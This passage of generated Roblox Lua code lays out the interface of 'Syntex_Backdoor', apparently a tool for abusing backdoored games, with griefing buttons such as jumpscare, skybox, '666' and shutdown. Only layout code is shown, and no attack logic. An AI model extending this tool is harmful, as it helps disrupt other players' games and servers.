G2L["8d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8d"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["8d"]["TextColor3"] = Color3.fromRGB(224, 191, 6);
G2L["8d"]["BackgroundTransparency"] = 1;
G2L["8d"]["Size"] = UDim2.new(0, 195, 0, 22);
G2L["8d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8d"]["Text"] = [[-- Update Logs --]];
G2L["8d"]["Position"] = UDim2.new(0, 0, 0.04286, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Home.lilcontainer.TextLabel
G2L["8e"] = Instance.new("TextLabel", G2L["8a"]);
G2L["8e"]["BorderSizePixel"] = 0;
G2L["8e"]["TextSize"] = 14;
G2L["8e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["8e"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["8e"]["TextColor3"] = Color3.fromRGB(98, 224, 0);
G2L["8e"]["BackgroundTransparency"] = 1;
G2L["8e"]["Size"] = UDim2.new(0, 195, 0, 21);
G2L["8e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8e"]["Text"] = [[- Added Auto-Complete]];
G2L["8e"]["Position"] = UDim2.new(0, 0, 0.29286, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Home.lilcontainer.Frame
G2L["8f"] = Instance.new("Frame", G2L["8a"]);
G2L["8f"]["BorderSizePixel"] = 0;
G2L["8f"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
G2L["8f"]["Size"] = UDim2.new(0, 195, 0, 2);
G2L["8f"]["Position"] = UDim2.new(0, 0, 0.24286, 0);
G2L["8f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["8f"]["BackgroundTransparency"] = 0.2;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Home.lilcontainer.TextLabel
G2L["90"] = Instance.new("TextLabel", G2L["8a"]);
G2L["90"]["BorderSizePixel"] = 0;
G2L["90"]["TextSize"] = 14;
G2L["90"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["90"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["90"]["TextColor3"] = Color3.fromRGB(72, 224, 0);
G2L["90"]["BackgroundTransparency"] = 1;
G2L["90"]["Size"] = UDim2.new(0, 195, 0, 29);
G2L["90"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["90"]["Text"] = [[- Fixed the scanner]];
G2L["90"]["Position"] = UDim2.new(0, 0, 0.44128, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Home.lilcontainer.TextLabel
G2L["91"] = Instance.new("TextLabel", G2L["8a"]);
G2L["91"]["BorderSizePixel"] = 0;
G2L["91"]["TextSize"] = 14;
G2L["91"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["91"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["91"]["TextColor3"] = Color3.fromRGB(72, 224, 0);
G2L["91"]["BackgroundTransparency"] = 1;
G2L["91"]["Size"] = UDim2.new(0, 195, 0, 27);
G2L["91"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["91"]["Text"] = [[- R6 Button Back :D]];
G2L["91"]["Position"] = UDim2.new(0, 0, 0.62143, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Home.lilcontainer.TextLabel
G2L["92"] = Instance.new("TextLabel", G2L["8a"]);
G2L["92"]["BorderSizePixel"] = 0;
G2L["92"]["TextSize"] = 11;
G2L["92"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["92"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["92"]["TextColor3"] = Color3.fromRGB(224, 210, 210);
G2L["92"]["BackgroundTransparency"] = 1;
G2L["92"]["Size"] = UDim2.new(0, 195, 0, 21);
G2L["92"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["92"]["Text"] = [[- More things are coming for V1.2.6... -]];
G2L["92"]["Position"] = UDim2.new(0, 0, 0.85, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.Home.thnks
G2L["93"] = Instance.new("TextLabel", G2L["7c"]);
G2L["93"]["TextWrapped"] = true;
G2L["93"]["BorderSizePixel"] = 0;
G2L["93"]["TextSize"] = 21;
G2L["93"]["TextXAlignment"] = Enum.TextXAlignment.Left;
G2L["93"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["93"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["93"]["TextColor3"] = Color3.fromRGB(107, 255, 99);
G2L["93"]["BackgroundTransparency"] = 1;
G2L["93"]["RichText"] = true;
G2L["93"]["Size"] = UDim2.new(0, 264, 0, 143);
G2L["93"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["93"]["Text"] = [[Thanks for using ! Also, to everyone in my discord server, tysm for the 500 members, yeaa 500, even almost 600, our commu has grown so fast those times, and for that , <font color="#FF0000">T</font><font color="#FF8485">h</font><font color="#FFFF00">a</font><font color="#0000FF">n</font><font color="#00FF00">k</font><font color="#7f00ff">s</font> :D]];
G2L["93"]["Name"] = [[thnks]];
G2L["93"]["Position"] = UDim2.new(0.45354, 0, 0.45863, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub
G2L["94"] = Instance.new("Frame", G2L["d"]);
G2L["94"]["Visible"] = false;
G2L["94"]["BorderSizePixel"] = 0;
G2L["94"]["BackgroundColor3"] = Color3.fromRGB(25, 25, 25);
G2L["94"]["Size"] = UDim2.new(0, 511, 0, 284);
G2L["94"]["Position"] = UDim2.new(0.23491, 0, 0.00091, 0);
G2L["94"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["94"]["Name"] = [[ScriptHub]];
G2L["94"]["BackgroundTransparency"] = 0.1;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame
G2L["95"] = Instance.new("ScrollingFrame", G2L["94"]);
G2L["95"]["Active"] = true;
G2L["95"]["BorderSizePixel"] = 0;
G2L["95"]["BackgroundColor3"] = Color3.fromRGB(166, 166, 166);
G2L["95"]["Size"] = UDim2.new(0, 487, 0, 255);
G2L["95"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["95"]["Position"] = UDim2.new(0.02257, 0, 0.04739, 0);
G2L["95"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["95"]["ScrollBarThickness"] = 0;
G2L["95"]["BackgroundTransparency"] = 1;


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.UICorner
G2L["96"] = Instance.new("UICorner", G2L["95"]);
G2L["96"]["CornerRadius"] = UDim.new(0, 5);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Decal
G2L["97"] = Instance.new("TextButton", G2L["95"]);
G2L["97"]["TextWrapped"] = true;
G2L["97"]["BorderSizePixel"] = 0;
G2L["97"]["TextColor3"] = Color3.fromRGB(231, 231, 231);
G2L["97"]["TextSize"] = 24;
G2L["97"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["97"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["97"]["Size"] = UDim2.new(0, 133, 0, 43);
G2L["97"]["Name"] = [[Decal]];
G2L["97"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["97"]["Text"] = [[Set Decal]];
G2L["97"]["Position"] = UDim2.new(0.03593, 0, 0.02993, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Decal.LocalScript
G2L["98"] = Instance.new("LocalScript", G2L["97"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Decal.UICorner
G2L["99"] = Instance.new("UICorner", G2L["97"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Decal.UIStroke
G2L["9a"] = Instance.new("UIStroke", G2L["97"]);
G2L["9a"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["9a"]["Thickness"] = 2;
G2L["9a"]["Color"] = Color3.fromRGB(41, 41, 41);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Particles
G2L["9b"] = Instance.new("TextButton", G2L["95"]);
G2L["9b"]["TextWrapped"] = true;
G2L["9b"]["BorderSizePixel"] = 0;
G2L["9b"]["TextColor3"] = Color3.fromRGB(231, 231, 231);
G2L["9b"]["TextSize"] = 20;
G2L["9b"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["9b"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["9b"]["Size"] = UDim2.new(0, 133, 0, 43);
G2L["9b"]["Name"] = [[Particles]];
G2L["9b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9b"]["Text"] = [[Set Particles]];
G2L["9b"]["Position"] = UDim2.new(0.36308, 0, 0.02969, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Particles.LocalScript
G2L["9c"] = Instance.new("LocalScript", G2L["9b"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Particles.UICorner
G2L["9d"] = Instance.new("UICorner", G2L["9b"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Particles.UIStroke
G2L["9e"] = Instance.new("UIStroke", G2L["9b"]);
G2L["9e"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["9e"]["Thickness"] = 2;
G2L["9e"]["Color"] = Color3.fromRGB(41, 41, 41);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.666
G2L["9f"] = Instance.new("TextButton", G2L["95"]);
G2L["9f"]["TextWrapped"] = true;
G2L["9f"]["BorderSizePixel"] = 0;
G2L["9f"]["TextColor3"] = Color3.fromRGB(231, 231, 231);
G2L["9f"]["TextSize"] = 24;
G2L["9f"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["9f"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["9f"]["Size"] = UDim2.new(0, 133, 0, 43);
G2L["9f"]["Name"] = [[666]];
G2L["9f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["9f"]["Text"] = [[666]];
G2L["9f"]["Position"] = UDim2.new(0.69162, 0, 0.02849, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.666.LocalScript
G2L["a0"] = Instance.new("LocalScript", G2L["9f"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.666.UICorner
G2L["a1"] = Instance.new("UICorner", G2L["9f"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.666.UIStroke
G2L["a2"] = Instance.new("UIStroke", G2L["9f"]);
G2L["a2"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["a2"]["Thickness"] = 2;
G2L["a2"]["Color"] = Color3.fromRGB(41, 41, 41);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Hint
G2L["a3"] = Instance.new("TextButton", G2L["95"]);
G2L["a3"]["TextWrapped"] = true;
G2L["a3"]["BorderSizePixel"] = 0;
G2L["a3"]["TextColor3"] = Color3.fromRGB(231, 231, 231);
G2L["a3"]["TextSize"] = 24;
G2L["a3"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["a3"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["a3"]["Size"] = UDim2.new(0, 133, 0, 43);
G2L["a3"]["Name"] = [[Hint]];
G2L["a3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a3"]["Text"] = [[Set Hint]];
G2L["a3"]["Position"] = UDim2.new(0.03454, 0, 0.13834, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Hint.LocalScript
G2L["a4"] = Instance.new("LocalScript", G2L["a3"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Hint.UICorner
G2L["a5"] = Instance.new("UICorner", G2L["a3"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Hint.UIStroke
G2L["a6"] = Instance.new("UIStroke", G2L["a3"]);
G2L["a6"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["a6"]["Thickness"] = 2;
G2L["a6"]["Color"] = Color3.fromRGB(41, 41, 41);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Message
G2L["a7"] = Instance.new("TextButton", G2L["95"]);
G2L["a7"]["TextWrapped"] = true;
G2L["a7"]["BorderSizePixel"] = 0;
G2L["a7"]["TextColor3"] = Color3.fromRGB(231, 231, 231);
G2L["a7"]["TextSize"] = 20;
G2L["a7"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["a7"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["a7"]["Size"] = UDim2.new(0, 133, 0, 43);
G2L["a7"]["Name"] = [[Message]];
G2L["a7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["a7"]["Text"] = [[Set Message]];
G2L["a7"]["Position"] = UDim2.new(0.36308, 0, 0.13832, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Message.LocalScript
G2L["a8"] = Instance.new("LocalScript", G2L["a7"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Message.UICorner
G2L["a9"] = Instance.new("UICorner", G2L["a7"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Message.UIStroke
G2L["aa"] = Instance.new("UIStroke", G2L["a7"]);
G2L["aa"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["aa"]["Thickness"] = 2;
G2L["aa"]["Color"] = Color3.fromRGB(41, 41, 41);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Disco
G2L["ab"] = Instance.new("TextButton", G2L["95"]);
G2L["ab"]["TextWrapped"] = true;
G2L["ab"]["BorderSizePixel"] = 0;
G2L["ab"]["TextColor3"] = Color3.fromRGB(231, 231, 231);
G2L["ab"]["TextSize"] = 24;
G2L["ab"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["ab"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["ab"]["Size"] = UDim2.new(0, 133, 0, 43);
G2L["ab"]["Name"] = [[Disco]];
G2L["ab"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["ab"]["Text"] = [[Disco]];
G2L["ab"]["Position"] = UDim2.new(0.69162, 0, 0.13849, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Disco.LocalScript
G2L["ac"] = Instance.new("LocalScript", G2L["ab"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Disco.UICorner
G2L["ad"] = Instance.new("UICorner", G2L["ab"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Disco.UIStroke
G2L["ae"] = Instance.new("UIStroke", G2L["ab"]);
G2L["ae"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["ae"]["Thickness"] = 2;
G2L["ae"]["Color"] = Color3.fromRGB(41, 41, 41);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Skybox
G2L["af"] = Instance.new("TextButton", G2L["95"]);
G2L["af"]["TextWrapped"] = true;
G2L["af"]["BorderSizePixel"] = 0;
G2L["af"]["TextColor3"] = Color3.fromRGB(231, 231, 231);
G2L["af"]["TextSize"] = 24;
G2L["af"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["af"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["af"]["Size"] = UDim2.new(0, 133, 0, 43);
G2L["af"]["Name"] = [[Skybox]];
G2L["af"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["af"]["Text"] = [[Set Skybox]];
G2L["af"]["Position"] = UDim2.new(0.03454, 0, 0.24569, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Skybox.LocalScript
G2L["b0"] = Instance.new("LocalScript", G2L["af"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Skybox.UICorner
G2L["b1"] = Instance.new("UICorner", G2L["af"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Skybox.UIStroke
G2L["b2"] = Instance.new("UIStroke", G2L["af"]);
G2L["b2"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["b2"]["Thickness"] = 2;
G2L["b2"]["Color"] = Color3.fromRGB(41, 41, 41);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Sound
G2L["b3"] = Instance.new("TextButton", G2L["95"]);
G2L["b3"]["TextWrapped"] = true;
G2L["b3"]["BorderSizePixel"] = 0;
G2L["b3"]["TextColor3"] = Color3.fromRGB(231, 231, 231);
G2L["b3"]["TextSize"] = 24;
G2L["b3"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["b3"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["b3"]["Size"] = UDim2.new(0, 133, 0, 43);
G2L["b3"]["Name"] = [[Sound]];
G2L["b3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b3"]["Text"] = [[Set Sound]];
G2L["b3"]["Position"] = UDim2.new(0.363, 0, 0.246, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Sound.LocalScript
G2L["b4"] = Instance.new("LocalScript", G2L["b3"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Sound.UICorner
G2L["b5"] = Instance.new("UICorner", G2L["b3"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Sound.UIStroke
G2L["b6"] = Instance.new("UIStroke", G2L["b3"]);
G2L["b6"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["b6"]["Thickness"] = 2;
G2L["b6"]["Color"] = Color3.fromRGB(41, 41, 41);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.AnimatedHint
G2L["b7"] = Instance.new("TextButton", G2L["95"]);
G2L["b7"]["BorderSizePixel"] = 0;
G2L["b7"]["TextColor3"] = Color3.fromRGB(231, 231, 231);
G2L["b7"]["TextSize"] = 14;
G2L["b7"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["b7"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["b7"]["Size"] = UDim2.new(0, 133, 0, 43);
G2L["b7"]["Name"] = [[AnimatedHint]];
G2L["b7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["b7"]["Text"] = [[Set Animated Hint]];
G2L["b7"]["Position"] = UDim2.new(0.69162, 0, 0.24513, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.AnimatedHint.LocalScript
G2L["b8"] = Instance.new("LocalScript", G2L["b7"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.AnimatedHint.UICorner
G2L["b9"] = Instance.new("UICorner", G2L["b7"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.AnimatedHint.new
G2L["ba"] = Instance.new("UIStroke", G2L["b7"]);
G2L["ba"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["ba"]["Name"] = [[new]];
G2L["ba"]["Thickness"] = 2;
G2L["ba"]["Color"] = Color3.fromRGB(41, 41, 41);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.AnimatedMessage
G2L["bb"] = Instance.new("TextButton", G2L["95"]);
G2L["bb"]["BorderSizePixel"] = 0;
G2L["bb"]["TextColor3"] = Color3.fromRGB(231, 231, 231);
G2L["bb"]["TextSize"] = 12;
G2L["bb"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["bb"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["bb"]["Size"] = UDim2.new(0, 133, 0, 43);
G2L["bb"]["Name"] = [[AnimatedMessage]];
G2L["bb"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["bb"]["Text"] = [[Set Animated Message]];
G2L["bb"]["Position"] = UDim2.new(0.69162, 0, 0.35011, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.AnimatedMessage.LocalScript
G2L["bc"] = Instance.new("LocalScript", G2L["bb"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.AnimatedMessage.UICorner
G2L["bd"] = Instance.new("UICorner", G2L["bb"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.AnimatedMessage.new
G2L["be"] = Instance.new("UIStroke", G2L["bb"]);
G2L["be"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["be"]["Name"] = [[new]];
G2L["be"]["Thickness"] = 2;
G2L["be"]["Color"] = Color3.fromRGB(41, 41, 41);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.JohnDoe
G2L["bf"] = Instance.new("TextButton", G2L["95"]);
G2L["bf"]["TextWrapped"] = true;
G2L["bf"]["BorderSizePixel"] = 0;
G2L["bf"]["TextColor3"] = Color3.fromRGB(231, 231, 231);
G2L["bf"]["TextSize"] = 16;
G2L["bf"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["bf"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["bf"]["Size"] = UDim2.new(0, 133, 0, 43);
G2L["bf"]["Name"] = [[JohnDoe]];
G2L["bf"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["bf"]["Text"] = [[Be John Doe (R6 ONLY)]];
G2L["bf"]["Position"] = UDim2.new(0.36308, 0, 0.45363, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.JohnDoe.LocalScript
G2L["c0"] = Instance.new("LocalScript", G2L["bf"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.JohnDoe.UICorner
G2L["c1"] = Instance.new("UICorner", G2L["bf"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.JohnDoe.new
G2L["c2"] = Instance.new("UIStroke", G2L["bf"]);
G2L["c2"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["c2"]["Name"] = [[new]];
G2L["c2"]["Thickness"] = 2;
G2L["c2"]["Color"] = Color3.fromRGB(41, 41, 41);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Jumpscare
G2L["c3"] = Instance.new("TextButton", G2L["95"]);
G2L["c3"]["BorderSizePixel"] = 0;
G2L["c3"]["TextColor3"] = Color3.fromRGB(231, 231, 231);
G2L["c3"]["TextSize"] = 18;
G2L["c3"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["c3"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["c3"]["Size"] = UDim2.new(0, 133, 0, 43);
G2L["c3"]["Name"] = [[Jumpscare]];
G2L["c3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c3"]["Text"] = [[Set Jumpscare]];
G2L["c3"]["Position"] = UDim2.new(0.03454, 0, 0.45347, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Jumpscare.LocalScript
G2L["c4"] = Instance.new("LocalScript", G2L["c3"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Jumpscare.UICorner
G2L["c5"] = Instance.new("UICorner", G2L["c3"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Jumpscare.new
G2L["c6"] = Instance.new("UIStroke", G2L["c3"]);
G2L["c6"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["c6"]["Name"] = [[new]];
G2L["c6"]["Thickness"] = 2;
G2L["c6"]["Color"] = Color3.fromRGB(41, 41, 41);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.RandomC
G2L["c7"] = Instance.new("TextButton", G2L["95"]);
G2L["c7"]["TextWrapped"] = true;
G2L["c7"]["BorderSizePixel"] = 0;
G2L["c7"]["TextColor3"] = Color3.fromRGB(231, 231, 231);
G2L["c7"]["TextSize"] = 18;
G2L["c7"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["c7"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["c7"]["Size"] = UDim2.new(0, 133, 0, 43);
G2L["c7"]["Name"] = [[RandomC]];
G2L["c7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["c7"]["Text"] = [[Random Colors]];
G2L["c7"]["Position"] = UDim2.new(0.03454, 0, 0.55405, 0);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.RandomC.LocalScript
G2L["c8"] = Instance.new("LocalScript", G2L["c7"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.RandomC.UICorner
G2L["c9"] = Instance.new("UICorner", G2L["c7"]);



-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.RandomC.new
G2L["ca"] = Instance.new("UIStroke", G2L["c7"]);
G2L["ca"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
G2L["ca"]["Name"] = [[new]];
G2L["ca"]["Thickness"] = 2;
G2L["ca"]["Color"] = Color3.fromRGB(41, 41, 41);


-- StarterGui.Syntex_Backdoor.sb_v1.2.5.UI.mainContainer.ScriptHub.ScrollingFrame.Shutdown
G2L["cb"] = Instance.new("TextButton", G2L["95"]);
G2L["cb"]["TextWrapped"] = true;
G2L["cb"]["BorderSizePixel"] = 0;
G2L["cb"]["TextColor3"] = Color3.fromRGB(231, 231, 231);
G2L["cb"]["TextSize"] = 16;
G2L["cb"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["cb"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["cb"]["Size"] = UDim2.new(0, 133, 0, 43);
G2L["cb"]["Name"] = [[Shutdown]];
G2L["cb"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
